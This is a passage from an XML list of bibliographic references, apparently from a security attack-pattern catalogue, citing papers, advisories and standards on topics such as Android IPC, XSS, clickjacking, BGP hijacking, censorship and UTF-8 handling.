         <ns0:Author>Erika Chin</ns0:Author>
         <ns0:Author>Adrienne Porter Felt</ns0:Author>
         <ns0:Author>Kate Greenwood</ns0:Author>
         <ns0:Author>David Wagner</ns0:Author>
         <ns0:Title>Analyzing Inter-Application Communication in Android</ns0:Title>
         <ns0:Publication_Year>2011</ns0:Publication_Year>
         <ns0:Publisher>International Conference on Mobile Systems, Applications, and Services (MobiSys)</ns0:Publisher>
         <ns0:URL>https://people.eecs.berkeley.edu/~daw/papers/intents-mobisys11.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-429">
         <ns0:Title>Advisory: Unauthorized password recovery in phpBannerExchange</ns0:Title>
         <ns0:Publication_Year>2006</ns0:Publication_Year>
         <ns0:Publisher>RedTeam Pentesting GmbH</ns0:Publisher>
         <ns0:URL>http://www.redteam-pentesting.de/advisories/rt-sa-2006-005.txt</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-430">
         <ns0:Author>Tongbo Luo</ns0:Author>
         <ns0:Author>Hao Hao</ns0:Author>
         <ns0:Author>Wenliang Du</ns0:Author>
         <ns0:Author>Yifei Wang</ns0:Author>
         <ns0:Author>Heng Yin</ns0:Author>
         <ns0:Title>Attacks on WebView in the Android System</ns0:Title>
         <ns0:Publication_Year>2011</ns0:Publication_Year>
         <ns0:Publisher>Annual Computer Security Applications Conference (ACSAC)</ns0:Publisher>
         <ns0:URL>http://www.cis.syr.edu/~wedu/Research/paper/webview_acsac2011.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-434">
         <ns0:Author>Adrienne Porter Felt</ns0:Author>
         <ns0:Author>David Wagner</ns0:Author>
         <ns0:Title>Phishing on Mobile Devices</ns0:Title>
         <ns0:Publication_Year>2011</ns0:Publication_Year>
         <ns0:Publisher>University of California, Berkeley</ns0:Publisher>
         <ns0:URL>https://people.eecs.berkeley.edu/~daw/papers/mobphish-w2sp11.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-436">
         <ns0:Author>Marcus Niemietz</ns0:Author>
         <ns0:Author>Jorg Schwenk</ns0:Author>
         <ns0:Title>UI Redressing Attacks on Android Devices</ns0:Title>
         <ns0:Publication_Year>2012</ns0:Publication_Year>
         <ns0:Publisher>Horst Gortz Institute for IT-Security</ns0:Publisher>
         <ns0:URL>https://media.blackhat.com/ad-12/Niemietz/bh-ad-12-androidmarcus_niemietz-WP.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-437">
         <ns0:Author>David Richardson</ns0:Author>
         <ns0:Title>Look-10-007 - Tapjacking</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>Lookout Mobile Security</ns0:Publisher>
         <ns0:URL>https://blog.lookout.com/look-10-007-tapjacking/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-438">
         <ns0:Author>Ami Luttwak</ns0:Author>
         <ns0:Title>A new Zeus variant targeting Salesforce.com &#8211; Research and Analysis</ns0:Title>
         <ns0:Publisher>Adallom, Inc.</ns0:Publisher>
         <ns0:URL>http://www.adallom.com/blog/a-new-zeus-variant-targeting-salesforce-com-accounts-research-and-analysis/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-439">
         <ns0:Author>John F. Miller</ns0:Author>
         <ns0:Title>Supply Chain Attack Framework and Attack Patterns</ns0:Title>
         <ns0:Publication_Year>2013</ns0:Publication_Year>
         <ns0:Publisher>The MITRE Corporation</ns0:Publisher>
         <ns0:URL>http://www.mitre.org/sites/default/files/publications/supply-chain-attack-framework-14-0228.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-445">
         <ns0:Title>Adobe Acrobat/Acrobat Reader ActiveX Control Buffer Overflow Vulnerability</ns0:Title>
         <ns0:Publication>iDefense Labs Public Advisory</ns0:Publication>
         <ns0:Publication_Year>2004</ns0:Publication_Year>
         <ns0:Publication_Month>--08</ns0:Publication_Month>
         <ns0:Publication_Day>---13</ns0:Publication_Day>
         <ns0:Publisher>Verisign, Inc.</ns0:Publisher>
         <ns0:URL>http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=126</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-446">
         <ns0:Title>PHP Input Validation Vulnerabilities</ns0:Title>
         <ns0:Publication>Bugtraq mailing list archive</ns0:Publication>
         <ns0:URL>http://msgs.securepoint.com/bugtraq/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-461">
         <ns0:Author>Kopo M. Ramokapane</ns0:Author>
         <ns0:Author>Awais Rashid</ns0:Author>
         <ns0:Author>Jose M. Such</ns0:Author>
         <ns0:Title>Assured Deletion in the Cloud: Requirements, Challenges and Future Directions</ns0:Title>
         <ns0:Publication>Association for Computing Machinery (ACM)</ns0:Publication>
         <ns0:Publisher>Proceedings of the 2016 ACM on Cloud Computing Security Workshop</ns0:Publisher>
         <ns0:URL>https://nms.kcl.ac.uk/jose.such/pubs/Assured_deletion.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-462">
         <ns0:Author>Small Media</ns0:Author>
         <ns0:Title>Satellite Jamming in Iran: A War over Airwaves</ns0:Title>
         <ns0:Publication_Year>2012</ns0:Publication_Year>
         <ns0:Publication_Month>--11</ns0:Publication_Month>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-463">
         <ns0:Author>Mark O'Neill</ns0:Author>
         <ns0:Title>Security for REST Web Services</ns0:Title>
         <ns0:Publisher>Vprde;</ns0:Publisher>
         <ns0:URL>http://www.vordel.com/downloads/rsa_conf_2006.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-464">
         <ns0:Title>Analysis of Country-wide Internet Outages Caused by Censorship</ns0:Title>
         <ns0:Publication_Year>2011</ns0:Publication_Year>
         <ns0:Publisher>Center for Applied Internet Data Analysis</ns0:Publisher>
         <ns0:URL>http://www.caida.org/publications/papers/2011/outages_censorship/outages_censorship.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-465">
         <ns0:Title>Why is it Taking so Long to Secure Internet Routing?</ns0:Title>
         <ns0:Publication_Year>2014</ns0:Publication_Year>
         <ns0:Publisher>ACM</ns0:Publisher>
         <ns0:URL>https://queue.acm.org/detail.cfm?id=2668966</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-466">
         <ns0:Title>Beware of BGP Attacks</ns0:Title>
         <ns0:Publication_Year>2004</ns0:Publication_Year>
         <ns0:Publisher>ACM SIGCOMM</ns0:Publisher>
         <ns0:URL>http://www.cc.gatech.edu/~dovrolis/Papers/ccr-bgp.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-467">
         <ns0:Title>Dozens of Online 'Dark Markets' Seized Pursuant to Forfeiture Complaint Filed in Manhattan Federal Court in Conjunction with the Arrest of the Operator of Silk Road 2.0</ns0:Title>
         <ns0:Publication_Year>2014</ns0:Publication_Year>
         <ns0:Publisher>FBI</ns0:Publisher>
         <ns0:URL>https://www.fbi.gov/contact-us/field-offices/newyork/news/press-releases/dozens-of-online-dark-markets-seized-pursuant-to-forfeiture-complaint-filed-in-manhattan-federal-court-in-conjunction-with-the-arrest-of-the-operator-of-silk-road-2.0</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-468">
         <ns0:Title>Deserialization of Untrusted Data</ns0:Title>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:Publication_Month>--01</ns0:Publication_Month>
         <ns0:Publisher>OWASP</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-469">
         <ns0:Title>Cross Frame Scripting</ns0:Title>
         <ns0:Publication_Year>2016</ns0:Publication_Year>
         <ns0:Publisher>OWASP</ns0:Publisher>
         <ns0:URL>https://www.owasp.org/index.php/Cross_Frame_Scripting</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-470">
         <ns0:Author>Gustave Rydstedt, Elie Bursztein, Dan Boneh, and Collin Jackson</ns0:Author>
         <ns0:Title>Busting Frame Busting: a Study of Clickjacking Vulnerabilities on Popular Sites</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publication_Month>--07</ns0:Publication_Month>
         <ns0:Publication_Day>---20</ns0:Publication_Day>
         <ns0:URL>https://seclab.stanford.edu/websec/framebusting/framebust.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-471">
         <ns0:Author>Amit Klein</ns0:Author>
         <ns0:Title>DOM Based Cross Site Scripting or XSS of the Third Kind</ns0:Title>
         <ns0:URL>http://www.webappsec.org/projects/articles/071105.shtml</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-472">
         <ns0:Author>Jakob Kallin</ns0:Author>
         <ns0:Author>Irene Lobo Valbuena</ns0:Author>
         <ns0:Title>A comprehensive tutorial on cross-site scripting</ns0:Title>
         <ns0:URL>https://excess-xss.com/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-473">
         <ns0:Title>Censorship in the Wild: Analyzing Internet Filtering in Syria</ns0:Title>
         <ns0:Publication_Year>2014</ns0:Publication_Year>
         <ns0:Publisher>Sigcomm</ns0:Publisher>
         <ns0:URL>http://conferences2.sigcomm.org/imc/2014/papers/p285.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-475">
         <ns0:Author>Abdelberi Chaabane</ns0:Author>
         <ns0:Author>Terence Chen</ns0:Author>
         <ns0:Author>Mathieu Cunche</ns0:Author>
         <ns0:Author>Emiliano De Cristofaro</ns0:Author>
         <ns0:Author>Arik Friedman</ns0:Author>
         <ns0:Author>Mohamed Ali Kaafar</ns0:Author>
         <ns0:Title>Censorship in the Wild: Analyzing Internet Filtering in Syria</ns0:Title>
         <ns0:Publication_Year>2014</ns0:Publication_Year>
         <ns0:Publication_Month>--02</ns0:Publication_Month>
         <ns0:Publisher>IMC 2014</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-476">
         <ns0:Author>Watchfire Research</ns0:Author>
         <ns0:Title>XSS vulnerabilities in Google.com</ns0:Title>
         <ns0:Publication>Full Disclosure mailing list archives</ns0:Publication>
         <ns0:URL>http://seclists.org/fulldisclosure/2005/Dec/1107</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-477">
         <ns0:Author>John-Paul Verkamp</ns0:Author>
         <ns0:Author>Minaxi Gupta</ns0:Author>
         <ns0:Title>Inferring Mechanics of Web Censorship Around the World</ns0:Title>
         <ns0:Publication_Year>2012</ns0:Publication_Year>
         <ns0:Publisher>USENIX</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-479">
         <ns0:Author>Anonymous</ns0:Author>
         <ns0:Title>Towards a Comprehensive Picture of the Great Firewall's DNS Censorship</ns0:Title>
         <ns0:Publication_Year>2014</ns0:Publication_Year>
         <ns0:Publisher>USENIX</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-482">
         <ns0:Author>Jouko Pynnonen</ns0:Author>
         <ns0:Title>Java Web Start argument injection vulnerability</ns0:Title>
         <ns0:URL>http://www.securityfocus.com/archive/1/393696</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-485">
         <ns0:Author>Artem Dinaburg</ns0:Author>
         <ns0:Title>Bitsquatting: DNS Hijacking without exploitation</ns0:Title>
         <ns0:Publisher>Raytheon</ns0:Publisher>
         <ns0:URL>http://media.blackhat.com/bh-us-11/Dinaburg/BH_US_11_Dinaburg_Bitsquatting_WP.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-486">
         <ns0:Author>Karsten Nohl</ns0:Author>
         <ns0:Title>Rooting SIM Cards</ns0:Title>
         <ns0:Publisher>Security Research Labs</ns0:Publisher>
         <ns0:URL>https://srlabs.de/rooting-sim-cards/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-487">
         <ns0:Author>Denis Foo Kune</ns0:Author>
         <ns0:Author>John Koelndorfer</ns0:Author>
         <ns0:Author>Nicholas Hopper</ns0:Author>
         <ns0:Author>Yongdae Kim</ns0:Author>
         <ns0:Title>Location Leaks on the GSM Air Interface</ns0:Title>
         <ns0:Publisher>University of Minnesota</ns0:Publisher>
         <ns0:URL>https://www-users.cs.umn.edu/~hoppernj/celluloc.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-489">
         <ns0:Title>Wikipedia</ns0:Title>
         <ns0:Publisher>The Wikimedia Foundation, Inc</ns0:Publisher>
         <ns0:URL>https://en.wikipedia.org/wiki/Spoofing_attack#GPS_Spoofing</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-491">
         <ns0:Author>Nick Nikiforakis</ns0:Author>
         <ns0:Author>Marco Balduzzi</ns0:Author>
         <ns0:Author>Lieven Desmet</ns0:Author>
         <ns0:Author>Frank Piessens</ns0:Author>
         <ns0:Author>Wouter Joosen</ns0:Author>
         <ns0:Title>Soundsquatting: Uncovering the Use of Homophones in Domain Squatting</ns0:Title>
         <ns0:Publisher>Trend Micro</ns0:Publisher>
         <ns0:URL>https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-soundsquatting.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-493">
         <ns0:Author>Means, Ryan L.</ns0:Author>
         <ns0:Title>Alternate Data Streams: Out of the Shadows and into the Light</ns0:Title>
         <ns0:Publisher>SANS Institute</ns0:Publisher>
         <ns0:URL>https://www.giac.org/paper/gcwn/230/alternate-data-streams-shadows-light/104234</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-495">
         <ns0:Author>Gunter Ollmann</ns0:Author>
         <ns0:Title>URL Encoded Attacks - Attacks using the common web browser</ns0:Title>
         <ns0:Publisher>CGISecurity.com</ns0:Publisher>
         <ns0:URL>http://www.cgisecurity.com/lib/URLEmbeddedAttacks.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-496">
         <ns0:Author>T. Berners-Lee</ns0:Author>
         <ns0:Author>R. Fielding</ns0:Author>
         <ns0:Author>L. Masinter</ns0:Author>
         <ns0:Title>RFC 3986 - Uniform Resource Identifier (URI): Generic Syntax</ns0:Title>
         <ns0:Publication_Year>2005</ns0:Publication_Year>
         <ns0:Publication_Month>--01</ns0:Publication_Month>
         <ns0:URL>http://www.ietf.org/rfc/rfc3986.txt</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-497">
         <ns0:Author>T. Berners-Lee</ns0:Author>
         <ns0:Author>L. Masinter</ns0:Author>
         <ns0:Author>M. McCahill</ns0:Author>
         <ns0:Title>RFC 1738 - Uniform Resource Locators (URL)</ns0:Title>
         <ns0:Publication_Year>1994</ns0:Publication_Year>
         <ns0:Publication_Month>--12</ns0:Publication_Month>
         <ns0:URL>http://www.ietf.org/rfc/rfc1738.txt</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-498">
         <ns0:Title>HTML URL Encoding Reference</ns0:Title>
         <ns0:Publication>W3Schools.com</ns0:Publication>
         <ns0:Publisher>Refsnes Data</ns0:Publisher>
         <ns0:URL>http://www.w3schools.com/tags/ref_urlencode.asp</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-499">
         <ns0:Title>The URLEncode and URLDecode Page</ns0:Title>
         <ns0:Publisher>Albion Research Ltd</ns0:Publisher>
         <ns0:URL>http://www.albionresearch.com/misc/urlencode.php</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-500">
         <ns0:Author>David Wheeler</ns0:Author>
         <ns0:Title>Secure Programming for Linux and Unix HOWTO</ns0:Title>
         <ns0:URL>http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/filter-html.html#VALIDATING-URIS</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-501">
         <ns0:Author>Stewart A.</ns0:Author>
         <ns0:Title>DLL SIDE-LOADING: A Thorn in the Side of the Anti-Virus Industry</ns0:Title>
         <ns0:Publisher>FireEye</ns0:Publisher>
         <ns0:URL>https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-503">
         <ns0:Author>scut</ns0:Author>
         <ns0:Author>team teso</ns0:Author>
         <ns0:Title>Exploiting Format String Vulnerabilities</ns0:Title>
         <ns0:URL>http://doc.bughunter.net/format-string/exploit-fs.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-504">
         <ns0:Author>Halvar Flake</ns0:Author>
         <ns0:Title>Auditing binaries for security vulnerabilities</ns0:Title>
         <ns0:URL>http://www.blackhat.com/presentations/bh-europe-00/HalvarFlake/HalvarFlake.ppt</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-505">
         <ns0:Title>Fortify Taxonomy of Vulnerabilities</ns0:Title>
         <ns0:Publisher>Fortify Software</ns0:Publisher>
         <ns0:URL>https://vulncat.hpefod.com/en</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-506">
         <ns0:Title>Syslog man page</ns0:Title>
         <ns0:URL>http://www.rt.com/man/syslog.3.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-520">
         <ns0:Author>Artur Maj</ns0:Author>
         <ns0:Title>Securing PHP: Step-by-Step</ns0:Title>
         <ns0:Publication_Year>2003</ns0:Publication_Year>
         <ns0:Publication_Month>--06</ns0:Publication_Month>
         <ns0:Publication_Day>---22</ns0:Publication_Day>
         <ns0:Publisher>Security Focus</ns0:Publisher>
         <ns0:URL>http://www.securityfocus.com/infocus/1706</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-521">
         <ns0:Author>Clancy Malcolm</ns0:Author>
         <ns0:Title>Ten Security Checks for PHP, Part 1</ns0:Title>
         <ns0:Publication_Year>2003</ns0:Publication_Year>
         <ns0:Publication_Month>--03</ns0:Publication_Month>
         <ns0:Publication_Day>---20</ns0:Publication_Day>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-522">
         <ns0:Title>PHP Manual</ns0:Title>
         <ns0:Publisher>The PHP Group</ns0:Publisher>
         <ns0:URL>http://www.php.net/manual/en/security.globals.php</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-525">
         <ns0:Author>Markus Kuhn</ns0:Author>
         <ns0:Title>UTF-8 and Unicode FAQ for Unix/Linux</ns0:Title>
         <ns0:Publication_Year>1999</ns0:Publication_Year>
         <ns0:Publication_Month>--06</ns0:Publication_Month>
         <ns0:Publication_Day>---04</ns0:Publication_Day>
         <ns0:URL>http://www.cl.cam.ac.uk/~mgk25/unicode.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-530">
         <ns0:Author>Michael Howard</ns0:Author>
         <ns0:Author>David LeBlanc</ns0:Author>
         <ns0:Title>Writing Secure Code</ns0:Title>
         <ns0:Publisher>Microsoft Press</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-531">
         <ns0:Author>Bruce Schneier</ns0:Author>
         <ns0:Title>Security Risks of Unicode</ns0:Title>
         <ns0:Publication>Crypto-Gram Newsletter</ns0:Publication>
         <ns0:Publication_Year>2000</ns0:Publication_Year>
         <ns0:Publication_Month>--07</ns0:Publication_Month>
         <ns0:Publication_Day>---15</ns0:Publication_Day>
         <ns0:URL>https://www.schneier.com/crypto-gram/archives/2000/0715.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-532">
         <ns0:Title>Wikipedia</ns0:Title>
         <ns0:Publisher>The Wikimedia Foundation, Inc</ns0:Publisher>
         <ns0:URL>http://en.wikipedia.org/wiki/UTF-8</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-533">
         <ns0:Author>F. Yergeau</ns0:Author>
         <ns0:Title>RFC 3629 - UTF-8, a transformation format of ISO 10646</ns0:Title>
         <ns0:Publication_Year>2003</ns0:Publication_Year>
         <ns0:Publication_Month>--11</ns0:Publication_Month>
         <ns0:URL>http://www.faqs.org/rfcs/rfc3629.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-535">
         <ns0:Title>Corrigendum #1: UTF-8 Shortest Form</ns0:Title>
         <ns0:Publication>The Unicode Standard</ns0:Publication>
         <ns0:Publication_Year>2001</ns0:Publication_Year>
         <ns0:Publication_Month>--03</ns0:Publication_Month>
         <ns0:Publisher>Unicode, Inc.</ns0:Publisher>
         <ns0:URL>http://www.unicode.org/versions/corrigendum1.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-537">
         <ns0:Author>Markus Kuhn</ns0:Author>
         <ns0:Title>UTF-8 decoder capability and stress test</ns0:Title>
         <ns0:Publication_Year>2003</ns0:Publication_Year>
         <ns0:Publication_Month>--02</ns0:Publication_Month>
         <ns0:Publication_Day>---19</ns0:Publication_Day>
         <ns0:URL>http://www.cl.cam.ac.uk/%7Emgk25/ucs/examples/UTF-8-test.txt</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-539">
         <ns0:Author>Shreeraj Shah</ns0:Author>
         <ns0:Title>Ajax fingerprinting for Web 2.0 Applications</ns0:Title>
         <ns0:Publication>Help Net Security</ns0:Publication>
         <ns0:URL>https://www.helpnetsecurity.com/dl/articles/Ajax_fingerprinting.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-543">
         <ns0:Title>Secunia Advisory SA16869: Firefox Command Line URL Shell Command Injection</ns0:Title>
         <ns0:Publication>Secunia Advisories</ns0:Publication>
         <ns0:Publication_Year>2005</ns0:Publication_Year>
         <ns0:Publication_Month>--09</ns0:Publication_Month>
         <ns0:Publication_Day>---20</ns0:Publication_Day>
         <ns0:Publisher>Secunia</ns0:Publisher>
         <ns0:URL>http://secunia.com/advisories/16869/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-547">
         <ns0:Author>Robert C. Seacord</ns0:Author>
         <ns0:Title>SAMATE - Software Assurance Metrics And Tool Evaluation</ns0:Title>
         <ns0:Publication_Year>2006</ns0:Publication_Year>
         <ns0:Publication_Month>--05</ns0:Publication_Month>
         <ns0:Publication_Day>---22</ns0:Publication_Day>
         <ns0:Publisher>National Institute of Standards and Technology (NIST)</ns0:Publisher>
         <ns0:URL>http://samate.nist.gov/SRD/view_testcase.php?tID=1511</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-548">
         <ns0:Author>Robert C. Seacord</ns0:Author>
         <ns0:Title>Secure Coding in C and C++</ns0:Title>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-550">
         <ns0:Author>A. Muffet</ns0:Author>
         <ns0:Title>The night the log was forged</ns0:Title>
         <ns0:URL>http://doc.novsu.ac.ru/oreilly/tcpip/puis/ch10_05.htm</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-551">
         <ns0:Title>The OWASP Application Security Desk Reference</ns0:Title>
         <ns0:Publication_Year>2009</ns0:Publication_Year>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://www.owasp.org/index.php/Log_Injection</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-552">
         <ns0:Author>Fortify Software</ns0:Author>
         <ns0:Title>SAMATE - Software Assurance Metrics And Tool Evaluation</ns0:Title>
         <ns0:Publication_Year>2006</ns0:Publication_Year>
         <ns0:Publication_Month>--06</ns0:Publication_Month>
         <ns0:Publication_Day>---22</ns0:Publication_Day>
         <ns0:Publisher>National Institute of Standards and Technology (NIST)</ns0:Publisher>
         <ns0:URL>https://samate.nist.gov/SRD/view_testcase.php?tID=1579</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-553">
         <ns0:Author>M. Bishop</ns0:Author>
         <ns0:Title>Computer Security: Art and Science</ns0:Title>
         <ns0:Publication_Year>2003</ns0:Publication_Year>
         <ns0:Publisher>Addison-Wesley</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-554">
         <ns0:Author>Walid Negm</ns0:Author>
         <ns0:Title>Anatomy of a Web Services Attack</ns0:Title>
         <ns0:Publication_Year>2004</ns0:Publication_Year>
         <ns0:Publication_Month>--03</ns0:Publication_Month>
         <ns0:Publication_Day>---01</ns0:Publication_Day>
         <ns0:Publisher>ForumSystems</ns0:Publisher>
         <ns0:URL>https://www.forumsys.com/wp-content/uploads/2014/01/Anatomy-of-a-Web-Services-Attack.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-555">
         <ns0:Author>Frank Coyle</ns0:Author>
         <ns0:Title>Seven Steps to XML Mastery</ns0:Title>
         <ns0:Publication_Year>2006</ns0:Publication_Year>
         <ns0:Publication_Month>--08</ns0:Publication_Month>
         <ns0:Publication_Day>---25</ns0:Publication_Day>
         <ns0:URL>http://www.informit.com/articles/article.aspx?p=601349</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-556">
         <ns0:Title>Wikipedia</ns0:Title>
         <ns0:Publisher>The Wikimedia Foundation, Inc</ns0:Publisher>
         <ns0:URL>http://en.wikipedia.org/wiki/Cryptanalysis</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-558">
         <ns0:Author>GulfTech Security Research</ns0:Author>
         <ns0:Title>PHPXMLRPC Remote Code Execution</ns0:Title>
         <ns0:Publication_Year>2005</ns0:Publication_Year>
         <ns0:Publication_Month>--06</ns0:Publication_Month>
         <ns0:Publication_Day>---29</ns0:Publication_Day>
         <ns0:URL>http://www.securityfocus.com/archive/1/403987</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-559">
         <ns0:Author>Jeff Warren</ns0:Author>
         <ns0:Title>Extracting Service Account Passwords with Kerberoasting</ns0:Title>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:Publication_Month>--05</ns0:Publication_Month>
         <ns0:Publication_Day>---09</ns0:Publication_Day>
         <ns0:URL>https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-560">
         <ns0:Title>Elaborate Ways to Exploit XSS: Flash Parameter Injection (FPI)</ns0:Title>
         <ns0:Publication_Year>2014</ns0:Publication_Year>
         <ns0:Publication_Month>--04</ns0:Publication_Month>
         <ns0:Publication_Day>---08</ns0:Publication_Day>
         <ns0:Publisher>Acunetix</ns0:Publisher>
         <ns0:URL>https://www.acunetix.com/blog/articles/elaborate-ways-exploit-xss-flash-parameter-injection/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-561">
         <ns0:Title>Cross-Site Flashing</ns0:Title>
         <ns0:Publisher>Trustwave</ns0:Publisher>
         <ns0:URL>http://doc.cenzic.com/sadoc9x14ba847/CPL0001509.htm</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-562">
         <ns0:Author>Kenn White</ns0:Author>
         <ns0:Title>Microsoft's Chain of Fools</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--01</ns0:Publication_Month>
         <ns0:Publication_Day>---15</ns0:Publication_Day>
         <ns0:Publisher>First Principles</ns0:Publisher>
         <ns0:URL>https://blog.lessonslearned.org/chain-of-fools/</ns0:URL>
         <ns0:URL_Date>2020-04-29</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-563">
         <ns0:Title>Patch Critical Cryptographic Vulnerability in Microsoft Windows Clients and Servers</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--01</ns0:Publication_Month>
         <ns0:Publication_Day>---14</ns0:Publication_Day>
         <ns0:Publisher>National Security Agency (NSA)</ns0:Publisher>
         <ns0:URL>https://media.defense.gov/2020/Jan/14/2002234275/-1/-1/0/CSA-WINDOWS-10-CRYPT-LIB-20190114.PDF</ns0:URL>
         <ns0:URL_Date>2020-04-29</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-564">
         <ns0:Author>Thomas Ptacek</ns0:Author>
         <ns0:Author>Thomas Pornin</ns0:Author>
         <ns0:Title>Analysis of REF-563</ns0:Title>
         <ns0:Publisher>Hacker News</ns0:Publisher>
         <ns0:URL>https://news.ycombinator.com/item?id=22048619</ns0:URL>
         <ns0:URL_Date>2020-04-29</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-565">
         <ns0:Title>ACSC Releases Advisory on Password Spraying Attacks</ns0:Title>
         <ns0:Publication_Year>2019</ns0:Publication_Year>
         <ns0:Publication_Month>--08</ns0:Publication_Month>
         <ns0:Publication_Day>---08</ns0:Publication_Day>
